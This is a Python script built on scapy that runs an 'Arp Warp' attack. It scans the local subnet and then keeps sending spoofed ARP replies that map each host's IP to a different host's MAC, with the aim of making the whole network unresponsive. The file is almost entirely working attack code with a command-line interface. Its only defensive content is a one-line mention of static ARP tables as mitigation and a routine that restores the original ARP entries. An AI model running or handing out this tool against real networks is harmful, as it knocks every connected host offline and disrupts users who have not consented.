import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from typing import Dict, Union
conf.verb = 0

#   --------------------------------------------------------------------------------------------------------------------
#
#   Arp Warp attack - Continously poison the ARP cache of all hosts on the connected network to make it unresponsive
#
#   Notes
#       * 
#
#   Mitigation
#       * Static ARP table
#
#   --------------------------------------------------------------------------------------------------------------------

banner = """
......_ ........______....... __........ ____....
...../ \.. ____|    \ \ ...../ /___ ____|    \...
..../   \.|  __|     \ \ /\ / /    |  __|     |..
.../ /.\ \| |  |  __/.\      /     | |..|  __/...
../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|......
"""


class ArpWarp:
    _P_TIMEOUT = 2
    _DEF_CIDR = 24 # todo argparse

    def __init__(self, iface, cidr):
        self.network_interface = iface
        self.cidr = cidr

        self.my_mac = Ether().src
        self.my_private_ip = get_if_addr(self.network_interface)

        self.arp_poison_interval = 1

        self.subnet = self.my_private_ip.split(".")[:3]

        self.original_arp_cache = self.generate_original_cache()
        if not len(self.original_arp_cache):
            raise Exception("No hosts were found on the network")
        self.poisoned_arp_cache = self.generate_poisoned_cache()

        self.abort = False

    def generate_original_cache(self) -> Dict[str, str]:
        arp_cache = dict()
        print(f"[*] Generating original ARP table for subnet {'.'.join(self.subnet)}.x, this might take 1-2 minutes...")

        subnet = ".".join(self.subnet + ["0"])
        arp_request = ARP(pdst=f"{subnet}/{self.cidr}")
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2)[0]

        for _ in range(3):  # perform several scans
            for element in answered_list:
                h_ip, h_mac = element[1][ARP].psrc, element[1][ARP].hwsrc
                if h_ip != self.my_private_ip and h_ip not in arp_cache:
                    print(f"[+] HOST IS UP {h_ip} -> {h_mac}")
                    arp_cache[h_ip] = h_mac
            time.sleep(5)

        print(f"[*] Finished generating original ARP table...")
        return arp_cache

    def generate_poisoned_cache(self) -> Dict[str, str]:
        """
        Generate a new poisoned cache table where each key has the value of the previous key
        """
        poisoned_table = dict()
        table_size = len(self.original_arp_cache)
        spoofed_values = [list(self.original_arp_cache.values())[i - 1] for i in range(table_size)]

        print(f"[*] Preparing poisoned ARP table...")
        for index, host_ip in enumerate(self.original_arp_cache.keys()):
            poisoned_table[host_ip] = spoofed_values[index]
            print(f"[*] Host {host_ip}\toriginal {self.original_arp_cache[host_ip]}"
                  f"\t spoofed {poisoned_table[host_ip]}")

        print(f"[*] Poisoned ARP table is ready")
        return poisoned_table

    def poison_arp(self):
        """
        iterate over all spoofed entries, and send each host (inside an inner loop) the
        arp packets of the scrambled entries
        """
        for poison_host_ip, poison_host_mac in self.poisoned_arp_cache.items():
            print(f"[*] Poisoning for {poison_host_ip}...")
            for target_host_ip, target_host_mac in self.original_arp_cache.items():
                if target_host_ip != poison_host_ip:
                    self.send_arp_packet(iface=self.network_interface,
                                         op=2,
                                         psrc=poison_host_ip,
                                         hwsrc=poison_host_mac,
                                         pdst=target_host_ip,
                                         hwdst=target_host_mac)

    def restore_arp(self):
        """
        restore the arp table to the original values for all network hosts
        """
        for restore_host_ip, restore_host_mac in self.original_arp_cache.items():
            print(f"[*] Restoring for {restore_host_ip}...")

            for target_host_ip, target_host_mac in self.original_arp_cache.items():
                if target_host_ip != restore_host_ip:
                    self.send_arp_packet(iface=self.network_interface,
                                         op=2,
                                         psrc=restore_host_ip,
                                         hwsrc=restore_host_mac,
                                         pdst=target_host_ip,
                                         hwdst=target_host_mac)

    def start_attack(self):
        loop_count = 0
        while not self.abort:
            try:
                loop_count += 1
                self.poison_arp()
                print(f"[*] Finished attack loop -> {loop_count}")
                time.sleep(self.arp_poison_interval)
            except Exception as exc:
                print(f"[!] Exception caught -> {exc}")
                self.abort = True
            except KeyboardInterrupt:
                print(f"[*] User requested to stop...")
                self.abort = True
        print("[*] Restoring arp...")
        self.restore_arp()

    @staticmethod
    def send_arp_packet(iface, await_res=False, **p_params) -> Union[None, scapy.layers.l2.Ether]:
        arp_packet = ARP(**p_params)
        if await_res:
            arp_res = srp1(Ether() / arp_packet, timeout=ArpWarp._P_TIMEOUT, iface=iface)
            return arp_res
        sendp(Ether() / arp_packet, iface=iface)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f'Perform an ARP cache poison attack',
                                     usage=f"./{os.path.basename(__file__)} iface")
    parser.add_argument("-i", "--network-interface", dest='iface', type=str, metavar=(""),
                        help="the name of the network interface (from `ifconfig`, i.e -> 'eth0')",
                        required=True)

    parser.add_argument("-m", "--set-mask", dest='mask', type=int, metavar=(""), default=24,
                        help="set the mask range (default -> /24 which means 0-256",
                        required=False)
    arguments = parser.parse_args()

    print(f"[*] Setting up a new attacker...")
    warper = ArpWarp(arguments.iface, arguments.mask)
    warper.start_attack()
